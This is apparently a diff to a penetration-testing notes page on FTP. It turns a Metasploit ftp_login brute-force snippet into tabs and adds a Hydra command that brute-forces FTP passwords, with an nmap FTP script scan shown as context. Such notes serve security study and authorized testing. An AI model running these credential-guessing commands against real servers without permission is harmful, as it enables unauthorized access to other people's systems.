@@ -61,12 +61,27 @@ sudo nmap -sV -p21 --script ftp-* -A <ip>
 
 #### Brute Force
 
-<pre data-line-numbers data-full-width="true"><code><strong>use auxiliary/scanner/ftp/ftp_login
-</strong><strong>set rhosts &#x3C;ip>
-</strong><strong>services -p 21 -R
-</strong><strong>set pass_file
-</strong><strong>set user_file
-</strong></code></pre>
+{% tabs %}
+{% tab title="Metasploit" %}
+{% code lineNumbers="true" fullWidth="true" %}
+```
+use auxiliary/scanner/ftp/ftp_login
+set rhosts <ip>
+services -p 21 -R
+set pass_file
+set user_file
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Hydra" %}
+{% code fullWidth="true" %}
+```
+hydra -t 1 -l {Username} -P {Passwordlist} -vV {IP} ftp
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
 
 #### FTP Bounce Port Scanner
 
